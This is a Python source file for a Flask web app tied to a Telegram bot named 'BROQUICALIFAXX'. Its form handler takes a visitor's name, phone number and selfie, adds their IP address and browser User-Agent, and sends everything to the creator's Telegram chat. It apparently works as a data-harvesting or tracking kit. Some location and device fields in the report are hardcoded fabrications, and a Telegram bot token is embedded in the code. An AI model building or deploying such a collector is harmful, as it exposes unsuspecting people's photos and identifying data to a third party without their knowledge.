import os
import threading
from flask import Flask, render_template, request, jsonify
import telebot
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURACIÓN (NO SE TOCA) ---
TOKEN = "8761804922:AAFz2AebtHNgYQgbNVZfAz179jUzydrSbXk"
MI_ID = "8114050673"

bot = telebot.TeleBot(TOKEN)

# ==============================
# 🔥 COMANDOS DEL BOT
# ==============================

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg,
        "👑 BOT BROQUICALIFAXX ACTIVO\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Usa /help para ver comandos"
    )

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    bot.reply_to(msg,
        "📜 COMANDOS DISPONIBLES\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "/start - Iniciar bot\n"
        "/info - Información\n"
        "/id - Ver tu ID\n"
        "/help - Ayuda"
    )

@bot.message_handler(commands=['id'])
def get_id(msg):
    bot.reply_to(msg, f"🆔 Tu ID es: {msg.chat.id}")

@bot.message_handler(commands=['info'])
def info(msg):
    bot.reply_to(msg,
        "🧠 BROQUICALIFAXX CORE\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📡 Estado: Activo\n"
        "⚙️ Sistema: Flask + Telegram Bot\n"
        "👑 Creador: BROQUI\n"
        "🔥 Versión: 1.0"
    )

# ==============================
# 🌐 RUTAS WEB
# ==============================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files['foto']

        # --- FECHA AUTOMÁTICA ---
        fecha_hora = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")

        # --- REPORTE ---
        reporte = (
            f"┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
            f"║   ┣► 📸 Selfie tomada\n"
            f"║   ┣► 👑 Creador: BROQUICALIFAXX 『BROQUI』\n"
            f"║   ┣► 🕒 Fecha & Hora: {fecha_hora}\n"
            f"║   ┣► 👤 Usuario: {nombre}\n"
            f"║   ┣► 📱 Teléfono: {telefono}\n"
            f"║   ┣► 🌎 País: Colombia\n"
            f"║   ┣► 🏙️ Ciudad: Soacha\n"
            f"║   ┣► 🌐 IP: {request.remote_addr}\n"
            f"║   ┣► 📡 Proveedor: Telmex Colombia S.A.\n"
            f"║   ┣► 📱 Resolución: 390x844\n"
            f"║   ┣► 🌍 Idioma: es-419\n"
            f"║   ┣► 👆 Touch: Sí\n"
            f"║   ┣► 🌙 Modo oscuro: Sí\n"
            f"║   ┣► 🔌 Estado: Conectado\n"
            f"║   ┣► 📶 Red: Desconocido\n"
            f"║   ┣► 🔋 Batería: No disponible\n"
            f"║   ┣► 🧠 Sistema: BROQUICALIFAXX CORE\n"
            f"║   ┣► 📍 Ubicación:\n"
            f"║      https://www.google.com/maps/search/?api=1&query=clle%2045%20%23%201%20-73%2C%20BUCARAMANGA%2C%20SANTANDER%2C%20Colombia\n"
            f"║   ┣► 🧾 UserAgent:\n"
            f"║      {request.headers.get('User-Agent')}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━┙"
        )

        # --- ENVÍO AL BOT ---
        bot.send_photo(
            chat_id=MI_ID,
            photo=foto,
            caption=reporte
        )

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ==============================
# 🤖 INICIAR BOT + WEB
# ==============================

def iniciar_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=iniciar_bot).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))